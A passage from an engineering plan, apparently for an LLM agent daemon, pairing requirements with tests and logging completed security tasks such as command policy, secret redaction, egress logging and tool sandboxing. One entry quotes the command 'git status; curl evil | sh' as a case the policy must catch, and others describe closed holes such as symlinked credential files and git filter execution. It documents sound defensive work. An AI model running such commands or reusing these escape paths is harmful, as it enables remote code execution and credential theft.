| REQ-CTX-003 | T-F1-11 | TestGitContext_REQ_CTX_003 |
| REQ-CTX-004 | T-F1-12, T-F1-13 | TestCompactionTriggeredOverWindow_REQ_CTX_004; T-F1-13: TestCompactedEventPersistedThenPublished_REQ_CTX_004 |
| REQ-CTX-005 | T-F1-11 | TestAttachmentTruncated_REQ_CTX_005 |
| REQ-LLM-001 | T-F1-05, T-F1-06 | TestStreamNormalized_REQ_LLM_001, TestOpenRouterStreamsThroughTheConfiguredBaseURL_REQ_LLM_001, TestEveryProviderTypeGetsItsAdapter_REQ_LLM_001; T-F1-06: TestOllamaStreamsNormalized_REQ_LLM_001, TestOllamaLive (tag `live`); T-F1-07: TestWhatTheAdapterCannotCarryIsRefused_REQ_LLM_001 |
| REQ-LLM-002 | T-F1-05 | TestDiscoverModels_REQ_LLM_002, TestDiscoverOpenRouterModels_REQ_LLM_002, TestCatalogDiscoversEveryProvider_REQ_LLM_002, TestTheCatalogPersists_REQ_LLM_002, TestModelListReachesTheWire_REQ_LLM_002, TestADaemonDiscoversModelsAtStart_REQ_LLM_002, TestOllamaDiscovers_REQ_LLM_002 |
| REQ-LLM-003 | T-F1-07 | TestFallbackOn429_REQ_LLM_003, TestAPermanentFailureDoesNotFallBack_REQ_LLM_003, TestAFailureAfterTheFirstTokenIsReturned_REQ_LLM_003, TestEveryCandidateFailing_REQ_LLM_003, TestALocalCandidateGetsTheLocalTimeout_REQ_LLM_003, TestARequestThatCannotBeBuiltIsNotRetried_REQ_LLM_003, TestCandidatesAreFilteredByCapabilityAndHealth_REQ_LLM_003, TestAServerThatHoldsItsHeadersTimesOut_REQ_LLM_003 |
| REQ-LLM-004 | T-F1-05, T-F1-07, T-F1-21 | TestOfflineRejectsRemote_REQ_LLM_004; T-F1-05: TestOfflineContactsNoRemoteProvider_REQ_LLM_004, TestOfflineReachesTheCatalog_REQ_LLM_004 |
| REQ-LLM-005 | T-F1-01, T-F1-07 | TestUsageRecorded_REQ_LLM_005, TestTheCostRoundsToTheNearestMicroUSD_REQ_LLM_005, TestUsageRowsAreWritten_REQ_LLM_005, TestTheGatewayNeedsAUsageLog_REQ_LLM_005 |
| REQ-LLM-006 | T-F1-06 | TestOllamaSendsNumCtx_REQ_LLM_006, TestOllamaRefusesABadNumCtx_REQ_LLM_006 |
| REQ-SEC-001 | T-F1-04, T-F1-07 | TestRedactionCorpus_REQ_SEC_001; T-F1-07: TestRedactionBeforeSending_REQ_SEC_001 |
| REQ-SEC-002 | T-F1-01, T-F1-05, T-F1-06, T-F1-07, T-F1-09, T-F1-21 | TestEgressLoggedForRemote_REQ_SEC_002; T-F1-05: TestEveryRemoteRequestIsLogged_REQ_SEC_002, TestEgressRowsAreWritten_REQ_SEC_002; T-F1-06: TestOllamaRemoteRequestsAreLogged_REQ_SEC_002; T-F1-07: TestTheCallCarriesItsThread_REQ_SEC_002; T-F1-09: TestFetchIsRedactedAndLogged_REQ_SEC_002 |
| REQ-SEC-004 | T-F1-02 | TestPlaintextKeyRejected_REQ_SEC_004, TestASecretInOptionsIsRejected_REQ_SEC_004 |
| REQ-SEC-005 | T-F1-03, T-F1-14 | TestDestructiveAlwaysAsk_REQ_SEC_005 |
| REQ-SEC-006 | T-F1-03, T-F1-09 | TestTaintedRequiresAsk_REQ_SEC_006, TestFetchMarksTaint_REQ_SEC_006 |
| REQ-MCP-001 | T-F1-17 | TestMcpToolsPrefixed_REQ_MCP_001 |
| REQ-MCP-002 | T-F1-17 | TestMcpAddMidThread_REQ_MCP_002 |
| REQ-MCP-003 | T-F1-17 | TestMcpReconnectBackoff_REQ_MCP_003 |
| REQ-MCP-004 | T-F1-17 | TestMcpDefaultAsk_REQ_MCP_004 |
| REQ-CLI-001 | T-F1-19 | TestUmbAiPipesStdin_REQ_CLI_001 |
| REQ-TUI-001 | T-F1-20 (+ T-F0-12) | TestTUIAgentPanel_REQ_TUI_001 |
| REQ-TUI-002 | T-F1-20 | TestModeToggle_REQ_TUI_002 |
| REQ-TUI-003 | T-F1-20 | TestAttachBlock_REQ_TUI_003 |
| REQ-OBS-001 | T-F1-18 | TestTurnTraceHasSpans_REQ_OBS_001 |
| REQ-OBS-002 | T-F1-15 | TestInvalidMetricIncrements_REQ_OBS_002 |
| REQ-AUT-001 | T-F1-23 | TestWaitPinsTurn_REQ_AUT_001 |
| REQ-AUT-002 | T-F1-23 | TestSendWaitRejectsBlocked_REQ_AUT_002 |
| REQ-AUT-003 | T-F1-23 | TestWaitOutputMatchesLine_REQ_AUT_003 |
| REQ-AUT-004 | T-F1-23 | TestWaitTimeoutReportsLastState_REQ_AUT_004 |
| REQ-AGT-016 | T-F1-24 | TestDoneUntilFocused_REQ_AGT_016 |
| REQ-AGT-017 | T-F1-24 | TestThreadsResumeAfterRestart_REQ_AGT_017 |
| REQ-INT-001 | T-F1-25 | TestEnvInjectedAndAuthoritative_REQ_INT_001 |
| REQ-INT-002 | T-F1-01, T-F1-25 | TestRecoveryClearsPaneStateAndMetadata_REQ_INT_002, TestExternalReportDrivesRollup_REQ_INT_002 |
| REQ-INT-003 | T-F1-25 | TestStaleSeqIgnored_REQ_INT_003 |
| REQ-INT-004 | T-F1-26 | TestMetadataNeverChangesWaits_REQ_INT_004 |
| REQ-INT-005 | T-F1-25 | TestReleaseRestoresOwnDetection_REQ_INT_005 |
| REQ-NTF-001 | T-F1-27 | TestNotificationNormalizesAndReports_REQ_NTF_001 |
| REQ-NTF-002 | T-F1-27 | TestNotificationRateLimited_REQ_NTF_002 |
| REQ-SEC-009 | T-F1-28 | TestExplainNamesDecidingRule_REQ_SEC_009 |
| REQ-SEC-010 | T-F1-29 | TestLocalRulesWin_REQ_SEC_010 |
| REQ-SEC-011 | T-F1-29, T-F1-30 | TestBundleRequiresValidSignature_REQ_SEC_011 |
| REQ-SEC-012 | T-F1-02 | TestEnvFallbackOnlyWhenEnabled_REQ_SEC_012, TestAnEnvProviderAsksTheKeyringFirst_REQ_SEC_012 |
| REQ-SEC-013 | T-F1-30 | TestRejectsUnknownKeyAndDowngrade_REQ_SEC_013 |
| REQ-SEC-014 | T-F1-30 | TestKeyLifecycleRequiresFingerprint_REQ_SEC_014 |
| REQ-SEC-015 | T-F1-30 | TestFailClosedAfterThreeFailures_REQ_SEC_015 |
| REQ-SEC-016 | T-F1-30 | TestRollbackAndResetWorkOffline_REQ_SEC_016 |
| REQ-SEC-008 | T-F1-02 | TestKeyringUnavailableDisablesProviders_REQ_SEC_008, TestAnUnreachableKeyringIsUnavailable_REQ_SEC_008, TestStatusCarriesEachProvidersReason_REQ_SEC_008, TestStatusShowsWhyAProviderIsDown_REQ_SEC_008, TestADaemonWithoutAKeyringStartsDegraded_REQ_SEC_008; T-F1-05: TestModelsOfADownProviderAreDown_REQ_SEC_008 |
| REQ-AGT-015 | T-F1-13 | TestSendIdempotentByClientMsgID_REQ_AGT_015 |
| REQ-AGT-018 | T-F1-09 | TestFetchUrlRefusesPrivateRanges_REQ_AGT_018, TestForbiddenAddress_REQ_AGT_018, TestFetchLimits_REQ_AGT_018 |
| REQ-INT-006 | T-F1-25 | TestOwnAgentCannotBeDisplaced_REQ_INT_006 |
| REQ-AUT-005 | T-F1-31 | TestLimitsDegradeWithoutDisconnect_REQ_AUT_005 |
| REQ-AUT-006 | T-F1-31 | TestWaitListReportsAgeAndStalled_REQ_AUT_006 |
| REQ-AUT-007 | T-F1-31 | TestCancelLeavesTurnRunning_REQ_AUT_007 |
| REQ-AUT-008 | T-F1-31 | TestStalledTurnNotifiedNotKilled_REQ_AUT_008 |
| REQ-OBS-004 | T-F1-18 | TestOrchestrationMetricsExposed_REQ_OBS_004 |
| REQ-SEC-017 | T-F1-32 | TestASilentConnectionIsClosedAfterTheDeadline_REQ_SEC_017 |
| REQ-SEC-018 | T-F1-32 | TestANotificationBeforeHelloIsUnauthorized_REQ_SEC_018 |
| REQ-API-005 | T-F1-33 | TestAResponseOverTheLimitIsResultTooLarge_REQ_API_005, TestResultTooLargeCarriesItsSizes_REQ_API_005 |
| REQ-OBS-005 | T-F1-33 | TestFramesAreCounted_REQ_OBS_005, TestStatusShowsTheFramesLine_REQ_OBS_005, TestLimitsShowsTheLimitAndTheCounters_REQ_OBS_005 |
| REQ-CLI-007 | T-F1-33 | TestLimitsSetRaisesTheLimitForNewConnections_REQ_CLI_007, TestAnOversizedAnswerTellsTheUserHowToRaiseTheLimit_REQ_CLI_007, TestLimitsSetSendsTheSizeInBytes_REQ_CLI_007, TestTheClientReadsWithTheLimitTheHandshakeAnnounced_REQ_CLI_007 |
| REQ-SKL-001 | T-F1-34, T-F1-35 | TestInstallCopiesRecordsAndRunsNothing_REQ_SKL_001, TestInstallAsksOrNeedsYes_REQ_SKL_001 |
| REQ-SKL-002 | T-F1-34 | TestABadBundleIsRefusedWhole_REQ_SKL_002, TestACrashMidInstallLeavesNothingAfterRestart_REQ_SKL_002 |
| REQ-SKL-003 | T-F1-35 | TestSkillCommandsMirrorTheMethods_REQ_SKL_003 |
| REQ-SKL-004 | T-F1-36 | TestPromptCarriesDescriptionsNotBodies_REQ_SKL_004 |
| REQ-SKL-005 | T-F1-36 | TestASkillCannotRunOrWidenAnything_REQ_SKL_005 |
| REQ-SKL-006 | T-F1-34 | TestARemoteSourceIsRefused_REQ_SKL_006 |
| REQ-SKL-007 | T-F1-36 | TestASkillChangeReachesTheNextTurn_REQ_SKL_007 |
| REQ-CLI-008 | T-F1-37 | TestMcpCommandsMirrorTheMethods_REQ_CLI_008, TestCliMayManageMcpServers_REQ_CLI_008 |
| REQ-TUI-004 | T-F1-37 | TestAgentPanelShowsServersAndSkills_REQ_TUI_004 |

**SHOULD/COULD covered or deferred:**

| REQ | Status |
|---|---|
| REQ-AGT-012 | SHOULD, covered by T-F1-09: TestEditFileProducesDiff_REQ_AGT_012, TestEditFileNeedsAUniqueMatch_REQ_AGT_012, TestAWriteThroughALinkWritesItsTarget_REQ_AGT_012 |
| REQ-LLM-007 | SHOULD, covered by T-F1-08: TestPresetsLoad_REQ_LLM_007, TestPresetsGetTheOpenAICompatAdapter_REQ_LLM_007 |
| REQ-OBS-003 | SHOULD, covered by T-F1-18 |
| REQ-LLM-008 | COULD, deferred to F2 |
| REQ-BLK-008 | SHOULD, deferred to F2 |

## Execution log

| Date | Tasks | Result | Notes |
|---|---|---|---|
| 2026-09-26 | T-F1-32 to T-F1-37 | added, not started | Four deltas ratified together and folded here. The fold drops the tasks' own "ratification bookkeeping" bullets and PRD entries, because ratification did that work: the REQs are in PRD 1.13, the `skills` table in Data Model 1.9, and the order in Plan 1.10. The API and Tech Design text stays with each task's Spec edits. API and Tech are bumped one step per task, in task order, and the versions each archived delta proposed are only a guide. |
| 2026-09-27 | T-F1-32 | done | The deadline is an absolute read deadline set at accept and cleared by a successful `system.hello`, so it lives on the read goroutine with the handshake state and cannot race a hello. An id-less or null-id hello is refused in `handleLine`, before the method table and the token. API 1.15 writes §1's JSON-RPC deviation, §2 steps 3/3a/5/6, §7's `UNAUTHORIZED` row and §8's deadline row. Each test was seen red against its own break (deadline removed, id check removed, pre-hello notification left silent, deadline not cleared). The `spec-guardian` review found the last one untested; the case `an authenticated connection outlives the deadline` closes it. It also found that §8's cap of 32 concurrent connections is **not enforced** by `Serve`: pre-existing, outside this task, still open. `task ci` green. |
| 2026-09-27 | T-F1-33 | done | Every outbound frame is serialised once in `conn.frame` and measured there: a response over the connection's limit becomes `RESULT_TOO_LARGE` (-32014) under its id, a notification becomes `limits.notification_dropped` under its `seq`, and `block.get` shortens its one output field first (raw on a 3-byte boundary, plain by bisection over the encoded JSON). The inbound limit moved from the scanner's buffer size into a split function reading the connection's own limit, so it can rise at `system.hello` without resizing a buffer mid-scan; before the handshake it stays 4 MiB. `limits.set` writes through `config.WriteMaxMessageBytes`, which implements the delta's file-cases table. Writing the real-daemon test found a **parser defect**: a quoted value followed by a comment (`max_message_bytes = "4MiB"  # why`) was read with the comment as part of the value, and the daemon refused to start; fixed in `parseTOMLSubset`, with cases in `TestMaxMessageBytesIsReadAndBounded`. Mutations: outbound refusal off, `block.get` fit off, each counter off, a payload in the warn line, hello keeping 4 MiB, the daemon not reading the setting, `limits.set` without a settings path and the `umb` hint off — each reddens its test. One survives and is equivalent: without `runeStart` the plain cut still lands on a rune boundary, because `encoding/json` makes every stray byte a 6-byte `\ufffd`, so a mid-rune cut is never the longest that fits; `runeStart` stays because it keeps the bisection's predicate monotone. The `spec-guardian` review found four more things, all fixed test-first: the inbound refusal's warn line named no size (it now logs `size_bytes_at_least`, and §5.2 says why it has no method); `api = { max_message_bytes = 128 }` was read as an unknown key and started the daemon at 4 MiB (inline tables and arrays are now refused as outside the subset); `ParseSize` called 100MiB "not a size" instead of out of range; and a CRLF file lost its `\r` on the rewritten line. The delta's Verification names `umb block get`, which does not exist; the hint test runs `umb block last`, `umb status` and `umb workspace list`. `umb limits set` itself runs only against a fake daemon; the real-daemon test drives `limits.set` through `internal/client`. API 1.16, Tech 1.14. `task ci` green. |
| 2026-09-27 | T-F1-01 | done | `0005_agent.sql` is the Data Model's DDL extracted from its `sql` blocks rather than retyped: 13 tables, 10 indexes and the two `ALTER TABLE threads` of §2.5, 25 statements that the `spec-guardian` review compared one by one with §2.4c–§2.13, identical and in the same order. `TestMigration0005Constraints` drives every `CHECK`, foreign key, unique and partial index, the safe defaults (`mcp_servers.trust` untrusted, `messages.tainted` 0) and the cascades (a thread takes its messages, its `usage` rows stay with `thread_id` NULL); `TestMigration0005AddsTheAttentionColumnsToExistingThreads` upgrades a database holding a thread at 0004. Recovery gains §6 steps 3 and 4 and — **beyond the task's letter** — step 8, because the tables now exist and no task owned clearing them. Only the state changes: an expiry sets no `decided_at` and a stop leaves `updated_at` alone, so a crash does not reorder `thread.list`. The review also found T-F1-24's text telling it to write the attention columns into 0005, which would edit an applied migration; T-F1-24 now writes to the columns T-F1-01 created. Open: `sdd_check.py` runs the spec's DDL but does not compare it with the migration files, so only this task's test and review prove 0005 matches. `task ci` green. |
| 2026-09-27 | T-F1-02 | done | The specs never gave the provider configuration a shape: Tech §5.1 named only `config.toml`. The reference architecture did (`docs/ARCHITECTURE.md` §7: `models.toml`, `[[providers]]`, `api_key = "keyring:…"`, go-toml/v2 + JSON Schema + go-keyring), and T-F1-08 already names `examples/models.toml`, so this task followed it and wrote it into Tech 1.15 §5.1 rather than inventing one; spec-guardian ruled that this needs a delta (Art. 9), so it is written up as **`changes/_archive/2026-09-provider-config/`, pending the Tech Lead's ratification**; the code follows it. `models.toml` is real TOML validated by an embedded schema; `config.toml` keeps its subset parser and gains `[secrets] allow_env`. Credential resolution is a pure function in `security/domain` over two injected lookups; the keyring is a port with a go-keyring adapter that times out a wedged D-Bus, and is probed only when a provider names it, since a locked desktop keyring can prompt. At start a plaintext key refuses its entry (reported `down`/`plaintext_secret`); on `config.reload` it refuses the reload and nothing is applied. `TestADaemonWithoutAKeyringStartsDegraded_REQ_SEC_008` runs all three REQs against a real daemon whose D-Bus points at nothing, and checks neither secret reaches its log. API 1.17 (§5.28, §5.2 `reason`, `config` capability), Tech 1.15. Models' own `health = down` (REQ-SEC-008's second clause) waits for T-F1-05, which creates the model rows; until then the provider carries it, and T-F1-05 now owns it with a named test. The review also hardened three things: a malformed `keyring:`/`env:` reference no longer echoes its value, an option named like a credential (`[providers.options] token = …`) refuses its entry like a plaintext `api_key`, and a reload of a file that does not parse names the file in `details`. `task ci` green. |
| 2026-09-27 | T-F1-03 | done | `Decide(Action, Mode, Rules, tainted)` is pure and returns the verdict, the reason (`approvals.reason`'s values for `ask`, `deny_rule`/`not_exposed` for `deny`), the deciding step, whether `always` may be offered, and a complete trace ready for `policy.explain` (T-F1-28). spec-guardian found the approved specs contradicting each other (DD-006 vs the §5.3 table, DD-006 vs REQ-AGT-013, API §5.36's trace) and silent on compound command lines, so the choices are written up as **delta `2026-09-policy-precedence`, proposed and pending ratification**: an exposure step 0 (`ask` and unknown modes deny what they do not expose); a destructive pattern as a floor that a `deny` rule still overrides; `auto-edit` asking for any write outside the write root whatever the `allow` rules; a `deny` rule matching any command of a line while `allow` rules must cover every one (`git status*` no longer carries `git status; curl evil \| sh`); every step traced. Destructive patterns are regexes over each normalised simple command — `sudo`, `env`, `timeout`, `eval`, `busybox`, `sh -c`, `find -exec`, chaining, `$(…)` and `/bin/rm` do not hide one; 53 destructive and 24 harmless lines in the tests. Write root: the nearest repo root at or above the cwd, I/O injected; the inside test is lexical. Coverage 98.6 %; 34 mutations over two rounds, all killed — one survivor exposed a line with no command being allowed by no rule at all, now closed. `task ci` green. |
| 2026-09-27 | T-F1-04 | done | `Redact(text)` returns the text with every match as `[REDACTED:<rule>]` and a count per rule for the egress audit; `Redactor{Rules, Entropy}` takes a bundle's rules (T-F1-29). Fourteen named rules (the task's list plus OpenRouter, Slack and the GCP key id) and the entropy detector. The corpus, `testdata/redact/corpus.json`, has 43 positives and 42 negatives; its secrets are `{{rand:N:CLASS}}` templates expanded by a seeded PRNG, and `{{PRIVATE}}` keeps PEM headers out of the file, so gitleaks and push protection see no key. **Two findings for the Tech Lead,** written into Tech 1.17 DD-008 and **delta `2026-09-redaction-thresholds`, proposed and pending ratification**: REQ-SEC-001's thresholds are read as necessary, not sufficient — Umbral ids (`thr_…`, up to 4.7 bits) and identifier-shaped tokens (long Go test names reach 4.56) are left alone, at a measured cost of ~0.05 % of random keys; and the 4.5-bit floor itself catches ~98 % of random 40-character keys but ~70 % at 32 and ~5 % at 24, since a string's own entropy cannot reach 4.5 bits under 23 characters. Mutation testing found a real bug: the `.env` rule required a letter before the keyword, so `PASSWORD=`, `TOKEN=` and `SECRET_KEY_BASE=` were never redacted; spec-guardian found a real leak: a match holding a placeholder was skipped whole, so `DB_PASSWORD=hunter2hunter2:AKIA…` kept the password — now only a match that is nothing but placeholders is skipped — and a `.env` rule that redacted `MAX_TOKENS` and `BYPASS_CACHE`, now matched by name segment. 24 mutations, all killed. `task ci` green. |
| 2026-09-27 | T-F1-05 | done | The gateway's first half. `llmgw/domain` holds the provider-neutral model, request and normalized event (`text_delta`, `reasoning_delta`, `tool_call`, `usage`, `done`) and a `ProviderError` whose `Retryable` is REQ-LLM-003's 429/5xx/transport rule for T-F1-07; `llmgw/ports` the `Provider` and `ModelStore` ports. Adapters on Fantasy v0.45.2: `openaicompat` serves `openai-compat`, `lmstudio` and `llamacpp`; `openrouter` uses Fantasy's OpenRouter provider, whose URL is built in, through an HTTP client that rewrites it to `base_url`; `fantasyconv` is what they share. Discovery reads `<base_url>/models`, OpenRouter's prices becoming micro-USD per Mtok. The catalog (`internal/llmgw`, a new `llmgw-service` component in `.go-arch-lint.yml`, same shape as `workspaces`) never contacts a provider down for its credential and lists its models `down` with the provider's reason — **REQ-SEC-008's second clause, closed here** (delta `2026-09-provider-config`, decision 8, no new column); a provider that does not answer keeps its models, `down`/`discovery_failed`. `model.list` (API 1.18: Model gains `reason`) and background discovery at start and on reload; `TestADaemonDiscoversModelsAtStart_REQ_LLM_002` runs it on a real daemon against a fake server. `llamacpp` added to the provider types (REQ-LLM-001 names it; Tech 1.18). Found on the way: T-F1-02's end-to-end test pointed its `openrouter` provider at the real service, which the daemon now contacts at start — moved to a refused loopback port. spec-guardian blocked the first version on Art. 4: discovery sent requests off the machine with no `egress_log` row. The hook REQ-SEC-002 gave T-F1-07 therefore lands here, as an HTTP transport under every adapter that writes the row before sending and fails closed (`egresslog` adapter; thread NULL for the daemon's own requests); `router.offline = true` now means no remote provider is contacted, discovery included (`offline` reason, delta decision 8b); keys stay in a redacting `APIKey` up to the header, and both providers format without their insides, where Fantasy keeps the key; the OpenRouter rewrite refuses any URL outside its own instead of passing it through with the key; removed providers' rows are deleted; `golang.org/x/crypto`, new with Fantasy, bumped to v0.56.0 (one uncalled advisory has no fix). 44 mutations over three rounds, all killed. `task ci` green. |
| 2026-09-27 | T-F1-06 | done | Native Ollama adapter over `/api/chat` NDJSON, written by hand: Fantasy has no Ollama provider, and Ollama's OpenAI endpoint cannot carry `num_ctx` (DD-005). Every request carries `num_ctx` — the configured one, else 32768 capped at the model's window from `/api/tags` (delta `2026-09-provider-config`, 8d) — with `keep_alive` at the top level, `think` and `format` only when asked (the domain request gains `Reasoning` and `ResponseSchema`; tool results carry `ToolName`, which Ollama matches on). Discovery reads each model's capabilities and window; an embedding model is listed without tools, an older Ollama that reports no capabilities is assumed to take them. The wire format was taken from the local Ollama 0.33.3 rather than assumed: tool calls arrive whole with an `id` and arguments as an object, and the stream ends `done_reason: stop` even after one, reported here as `tool_calls`. An error inside the stream, a cut stream and a refused call are `ProviderError`s. `TestOllamaLive` passed against the local `gpt-oss:20b` in 20 s. The refused port T-F1-05 gave the e2e test's `ollama` provider is what keeps it off a real Ollama now that the daemon contacts it at start. A configured `num_ctx` that is not a positive integer is refused (`invalid_config`), and a test with a remote base URL proves discovery and chat go through the egress log and stop when it cannot be written (`TestOllamaRemoteRequestsAreLogged_REQ_SEC_002`; the mutant that bypassed the transport survived before it). 20 mutations, all killed. Open, and handed to T-F1-07: the openai-compat and OpenRouter adapters ignore `Reasoning` and `ResponseSchema`; before discovery has run in a process the window cap is unknown and 32768 is sent; `done_reason` values other than `stop` pass through raw. `task ci` green. |
| 2026-09-27 | T-F1-07 | done | The router lives in `internal/llmgw` beside the catalog (`llmgw-service`), not a `router/` package: it needs only the module's ports. It walks a class's candidates through the catalog (skipping one undiscovered or `down`, offline included), then the capability filter (tools, response schema, reasoning, window at four characters a token), in declared order. The request is redacted once with the built-in rules and the call's context carries its thread. Fallback is decided before the first event reaches the caller — 429, 5xx, transport failure, an empty stream, or no event within 30 s remote / 120 s local; a 4xx or a request that could not be built ends the call, and so does any failure after the first event. Every call made is one `usage` row, failures included (`rate_limited`, `timeout`, `error`), with its first-token time and its cost rounded to the micro-USD; a row that cannot be written is logged, not fatal. spec-guardian blocked the first version twice over: the first-token clock started only once `Stream` returned, but the real adapters send the request inside it, so an Ollama holding its headers while it loads a model was neither timed out nor left — reproduced against the real adapter and now `TestAServerThatHoldsItsHeadersTimesOut_REQ_LLM_003`; and tool descriptions, tool input schemas and the response schema left unredacted, against REQ-SEC-001's "all content" — every string in them is redacted now, on copies. The choices beyond REQ-LLM-003/005's text (no fallback after the first event, transport failures and empty streams fall back, other 4xx end the call, an adapter's refusal is not a call, the window estimate, a failed `usage` write is fail-open, the clock starting before the request) are **delta `2026-09-router-fallback`, proposed and pending ratification**. `gateway.configure` now sets the classes before the providers. From the T-F1-06 review: the Fantasy-based adapters now refuse reasoning and response schemas with `ErrUnsupported` rather than drop them, and the router skips them without recording a call; `ProviderError.Permanent` makes Ollama's unbuildable requests non-retryable. `TestEgressLoggedForRemote_REQ_SEC_002` drives the real Ollama adapter through the gateway's router at a remote host name served locally and checks the row's hash against the payload that left, which carries `[REDACTED:github_token]`. 44 mutations, all killed after the capability test was split so each model fails exactly one filter. No API method calls the router yet; T-F1-13's `thread.*` will, mapping `ErrNoCandidate` to `PROVIDER_UNAVAILABLE`. `task ci` green. |
| 2026-09-27 | T-F1-08 | done | `examples/models.toml` is a commented template: router, classes, the local Ollama, LM Studio and llama.cpp (the last two commented out), the two REQ-LLM-007 presets, and OpenRouter; every key a `keyring:` reference. `config.Presets` holds the Hugging Face router and OmniRoute as data, and `TestPresetsLoad_REQ_LLM_007` loads the example as shipped — nothing refused, the presets in step with the code, every class candidate naming a defined provider — while `TestPresetsGetTheOpenAICompatAdapter_REQ_LLM_007` checks both are served by the openai-compat adapter and every example provider gets one. Checking the example against the code found two wrong instructions before they shipped: go-keyring stores the account as the Secret Service attribute `username`, not `account`, so the `secret-tool` line would have stored a key the daemon never finds; and `umb` has no `config reload` command (only the API method). **Open for the Tech Lead:** a loopback OmniRoute that forwards to the cloud is `local` to Umbral — offline mode does not stop it and its onward traffic is not in `egress_log`. spec-guardian ruled that writing that consequence down is a decision, so it is decision 8e of the pending delta `2026-09-provider-config`, with a per-provider `local = false` override as the open question; the example warns beside the preset, keeps OmniRoute out of every default class, and no longer says offline means nothing leaves the machine. 5 mutations, all killed. `task ci` green. |
| 2026-09-27 | T-F1-09 | done | The tools module's registry and seven built-ins (`read_file`, `write_file`, `edit_file`, `grep`, `glob`, `list_dir`, `fetch_url`; `run_command` is T-F1-10), in `internal/tools/adapters/{registry,builtin}` since the arch rules map adapters there. Every tool registers a closed JSON Schema and a risk; input is validated (`invalid_args`) before a tool sees it, and **a call runs only under a grant** — the policy's `allow` or an approved `ask` — which makes AGENTS.md's "never outside `security.Decide()`" mechanical; the declared risk overrides whatever a tool's `Action` says. `write_file`/`edit_file` preview a unified diff (go-udiff) for `approval.requested`. Three gaps found by working against the specs rather than the task line: **Art. 4 covers `fetch_url`** — a URL the redaction rules would change is refused (a query string is the easy exfiltration channel) and every hop is recorded in `egress_log` before it is sent, failing closed; **REQ-AGT-018 only named redirects**, so the address check runs at dial time after DNS on every connection, with no proxy; and **Tech §5.3 left symlink resolution to this task**, which the first version skipped — a link inside the write root pointing out of it was allowed in `auto-edit`, now resolved through the nearest existing ancestor with the cwd and root. spec-guardian then blocked the commit on four more, three reproduced by running: a symlink swapped in while an approval waited still let the write escape the root (the write used the lexical path) — the grant now carries the action it was decided on and `Invoke` recomputes it, and writes run in an `os.Root` on the target's nearest directory; `read_file` on `/dev/zero` grew past 1 GiB of heap and a FIFO hung it — file tools now read only regular files of at most 16 MiB, opened non-blocking; a grant could be replayed on another call; and two files an early test version wrote into the package directory were staged (removed; an env that is not absolute is now refused). A write through an existing link now writes its target, as the diff shows. A second review found the write still resolved the path again after the check — reproduced, and closed by handing the tool the checked target (`Env.Target`) — and a malformed `%` escape that skipped the decoded-URL secret check, now a refusal. All written up as **delta `2026-09-builtin-tools`, proposed** (Tech 1.22 §5.3b, Data Model 1.10 §2.12). Tests run on loopback servers with an injected address policy; nothing reaches the network. Over 75 mutations in eight rounds: all killed but one equivalent; `os.Root` is defence against a swap during the write itself, which no deterministic test can stage, since `MkdirAll` already refuses a link component (`Replace` vs `ReplaceAll` when the match is unique). `task ci` green. |
| 2026-09-27 | T-F1-10 | done | `run_command` runs in the thread's own PTY: `sessions.RunForThread` finds the live session the thread owns or creates it (shell integration, `owner_thread_id`, input held by the agent), waits for the shell to prove its integration, hands the recorder a claim so the next block opens as origin `agent` with the thread, types the one-line command as the agent and returns when that block closes, with its exit code and output. The tool (`builtin/runcommand.go`, over the new `sessions/ports.AgentTerminal`) bounds the time (120 s, 1–600) and returns the last 64 KiB. Cancel was the hard part, found by running against a real bash: SIGINT to the shell does not interrupt `sleep 60 & wait`, and the foreground group is the shell's own while `wait` runs, so the cancel kills the process group of every child of the shell (read from `/proc`, `pgrep -P` elsewhere) and then interrupts the shell, which also ends a loop of builtins; a foreground-group `ioctl` added first proved redundant under mutation and was removed. `TestCancelUnder500ms_REQ_AGT_007` covers a background job, a foreground command and a builtin loop, each under 500 ms with the shell surviving. Found on the way: `session.list`/`get` never read `owner_thread_id` back, though the API declares it — fixed with a test. spec-guardian then required a delta entry for two decisions and found two races: the cancel now follows Tech §3 step 3 (SIGTERM, SIGKILL 300 ms later) aimed at the shell's children rather than its own group; a result whose block row failed is still returned but marked not persisted (C-01 for this path); a thread's first two commands started together no longer create two PTYs; and a cancelled run whose block had not closed keeps the PTY until it does or the shell prompts, so its late block cannot be taken for the next command's (not staged by a test: the window needs a shell that reads the line after 450 ms). The matrix keeps `TestCancelUnder500ms_REQ_AGT_007` for T-F1-16's `thread.cancel`; T-F1-10's is `TestKillForegroundUnder500ms_REQ_AGT_007`. Decisions 6–10 of delta `2026-09-builtin-tools` (proposed). 27 mutations, all killed. `task ci` green. |
| 2026-09-27 | — | deltas ratified | The Tech Lead ratified the five deltas T-F1-02…T-F1-10 raised (`provider-config`, `policy-precedence`, `redaction-thresholds`, `router-fallback`, `builtin-tools`) as written, and asked for the optional REQ sharpenings to be folded: REQ-SEC-001 (the 23-character floor, necessary-not-sufficient thresholds, the generic detector's recall), REQ-SEC-002 (`fetch_url`), REQ-AGT-018 (every connection, not only redirects), REQ-LLM-003 (before the first token reaches the caller) and REQ-LLM-005 (calls made to a provider). PRD 1.14, Tech 1.24, Data Model 1.11; the deltas are archived. T-F1-28 still writes API §5.36's example trace. |
| 2026-09-27 | T-F1-11 | done | `internal/context`: the domain orders the rules-file candidates (closest directory first; AGENTS → CLAUDE → WARP → CRUSH, each `.local.md` above its file), builds attachments capped at 256 KiB on a UTF-8 boundary with the omitted bytes counted against the file's size, and renders the system prompt and the user message from embedded `text/template`s; `adapters/local` reads rules from the cwd up to the policy's write root, `file`/`dir`/`block` attachments (regular files only, opened without blocking — a FIFO would hang the turn) and git context. Found while writing the git test: `git status` runs a repository's `core.fsmonitor` command. spec-guardian then reproduced the same for filter drivers (`clean` runs on a racily-clean file, in `status` and in `diff --stat`) — in `auto-edit` the agent may write `.git/config` itself, so reading context would run an Exec no policy decided on — and found that a rules file linked out of the repository (a clone can carry `AGENTS.md -> ~/.aws/credentials`) was read into every prompt, and that a git timeout or ownership refusal was taken for "not a repository". Now: every configured filter driver is overridden empty and not required (a name no `-c` can carry stops git), rules files are read only if they resolve inside the root, and a failing git is a section saying why. Written up as **delta `2026-09-context-assembly`, proposed**, with the bounds (rules files 256 KiB, git sections 32 KiB). Tech 1.25 §5.3c. The `Blocks` port is wired with the runtime in T-F1-13. 45 mutations over five rounds: all killed but equivalents — `--no-ext-diff`/`--no-textconv`/`diff.external` do not change `diff --stat` (kept as defence), an empty `process` alone already disables a filter so dropping `clean=` alone survives, `<=`/`<` at the exact limit, reading the resolved target rather than the link, and the exit-code test on `git config`. `task ci` green. |
